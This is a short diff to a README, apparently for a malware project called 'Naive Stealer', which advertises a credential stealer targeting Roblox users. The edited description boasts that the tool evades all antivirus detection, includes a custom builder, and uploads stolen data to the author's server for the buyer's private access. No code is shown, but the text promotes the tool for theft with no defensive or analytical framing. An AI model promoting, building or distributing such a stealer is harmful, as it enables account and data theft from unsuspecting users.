@@ -1,5 +1,5 @@
 # Naive Stealer + Website Hosting
-Stealer made specifically for Roblox that is fully undetected by antiviruses and comes with a custom builder interface
+Stealer made specifically for Roblox that is fully undetected by antiviruses and comes with a custom builder interface and can upload stolen data to Naive's server for your access only.
 
 # Features
 + Upload stolen data to private website just for you
